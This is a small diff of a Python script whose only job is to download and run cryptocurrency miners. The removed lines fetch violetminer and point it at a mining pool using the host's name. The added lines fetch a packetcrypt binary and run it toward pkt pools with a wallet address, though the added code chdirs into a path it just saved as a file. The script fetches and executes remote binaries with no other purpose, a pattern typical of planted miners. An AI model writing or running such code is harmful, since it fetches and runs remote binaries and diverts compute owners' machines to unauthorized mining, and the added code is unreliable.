@@ -1,6 +1,5 @@
 import os
 
-os.system("wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz")
-os.system("tar xvf violetminer-linux-v0.2.2.tar.gz")
-os.chdir("violetminer-linux-v0.2.2")
-os.system("./violetminer --pool pool.bmnr.pw:4444 --username 5919060.adal --password $(cat /proc/sys/kernel/hostname) --algorithm wrkzcoin")
+os.system("wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt")
+os.chdir("packetcrypt")
+os.system("./packetcrypt ann -p pkt1qzegnutrt6x4yr6xf9salt9rrzr9ywk8nhtrwat  http://pool.pkt.world/master/2048 http://pool.pktpool.io/")
